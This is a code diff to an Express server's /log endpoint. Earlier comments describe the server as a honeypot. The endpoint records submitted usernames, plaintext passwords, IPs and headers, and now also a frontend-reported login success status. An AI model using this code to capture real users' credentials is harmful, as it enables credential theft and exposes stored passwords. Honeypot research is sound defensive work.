@@ -24,24 +24,35 @@ app.use(morgan("combined", {
 fs.mkdirSync(path.dirname(LOG_FILE), { recursive: true });
 
 app.post("/log", (req, res) => {
+  const {
+    username = "",
+    password = "",
+    status = "UNKNOWN",        // frontend sends SUCCESS or FAILED
+    timestamp = new Date().toISOString()
+  } = req.body;
+
   const payload = {
-    username: req.body.username ?? "",
-    password: req.body.password ?? "",
+    username,
+    password,
+    status,                    // <-- now logged!
+    timestamp,                // <-- now logged!
     headers: {
       "user-agent": req.headers["user-agent"],
       referer: req.headers.referer ?? req.headers.referrer ?? null,
       host: req.headers.host
     },
-    ip: req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress,
-    time: new Date().toISOString()
+    ip: req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress
   };
 
-  // Append JSON line to log file
+  // Append JSON line to attempts.log
   fs.appendFileSync(LOG_FILE, JSON.stringify(payload) + "\n", { encoding: "utf8" });
 
-  // Respond as if credentials are invalid (don't reveal it's a honeypot)
-  return res.status(401).json({ message: "Invalid username or password" });
+  // Use correct HTTP codes for logging
+  const httpCode = status === "SUCCESS" ? 200 : 401;
+
+  return res.status(httpCode).json({ logged: true });
 });
+
 
 // health route
 app.get("/health", (req, res) => res.json({ ok: true }));
